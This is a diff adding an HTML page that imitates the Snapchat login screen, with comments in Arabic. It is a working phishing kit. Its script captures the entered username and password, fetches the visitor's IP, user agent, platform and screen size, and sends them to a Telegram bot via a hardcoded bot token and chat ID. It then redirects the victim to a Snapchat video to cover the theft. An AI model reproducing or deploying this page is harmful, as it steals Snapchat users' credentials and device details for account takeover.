@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
+    <title>Login • Snapchat
+
+    </title>
+  <link rel="stylesheet" href="loginsnab.css">
+</head>
+<body>
+
+  <!-- زر الرجوع -->
+  <button class="back-button" onclick="window.location.href='/Acconts.html';">
+    <img src="img/left-arrow.png" height="15" width="15">
+  </button>
+
+  <!-- شاشة التحميل -->
+  <div id="loading-screen" style="display:none;">
+    <div class="loader">
+
+    </div>
+  </div>
+
+  <!-- الحاوية -->
+  <div class="login-container">
+    <h1>Log In</h1>
+
+    <form id="login-form">
+      <label for="username">USERNAME OR EMAIL</label>
+      <input type="text" id="username" required>
+
+      <p class="alternate-option">
+        <a href="javascript:void(0);" id="switch-to-phone">
+          Use phone number instead
+        </a>
+      </p>
+
+      <label for="password">PASSWORD</label>
+      <div class="password-container">
+        <input type="password" id="password" required>
+        <button type="button" class="toggle-password">
+          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20">
+        </button>
+      </div>
+
+      <div class="save-info">
+        <input type="checkbox" id="save-login">
+        <label for="save-login">Save Login Info on your device</label>
+      </div>
+
+      <button type="submit" class="login-button">Log In</button>
+    </form>
+  </div>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "8160315316:AAEi1oWZDFHnMnX6tD7XysI2TfcXeOaSvpw";// Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
+    const CHAT_ID = "5957468709";// Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Username:</b> ${username}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            }); 
+
+    if(username && password){
+
+        // إظهار شاشة التحميل
+        const loader = document.getElementById("loading-screen");
+        loader.style.display = "flex";
+
+        // بعد ثانيتين يفتح الفيديو
+        setTimeout(() => {
+            window.location.href = "https://www.snapchat.com/@let0703/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYenl4bmtuenRxAZzn7CE2AZzn654hAAAAAQ"; // ضع رابط الفيديو أو أي رابط للتعلم
+        }, 2000);
+    } else {
+        alert("Please fill in all fields");
+    }
+});
+   </script>
+  </body>
+</html>
